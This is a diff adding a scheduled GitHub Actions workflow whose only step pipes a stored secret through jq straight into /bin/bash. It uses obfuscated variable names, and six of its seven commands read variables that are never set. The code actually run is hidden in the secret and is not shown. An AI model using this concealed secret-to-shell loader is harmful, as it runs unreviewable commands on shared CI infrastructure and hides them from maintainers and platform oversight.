@@ -1,0 +1,22 @@
+name: langshizhixin
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: langshizhixin
+        env:
+          xcv7: ${{ secrets.xcv7 }}
+        run: |
+          echo $xcv7 | jq -r .v3257 | /bin/bash
+          echo $gjz15 | jq -r .egpj875 | /bin/bash
+          echo $dce0514 | jq -r .arskt64943 | /bin/bash
+          echo $ffelh6 | jq -r .c85 | /bin/bash
+          echo $jhp7391 | jq -r .yjefz4 | /bin/bash
+          echo $mcgif8359 | jq -r .bak5350 | /bin/bash
+          echo $q6 | jq -r .fleq061 | /bin/bash
+
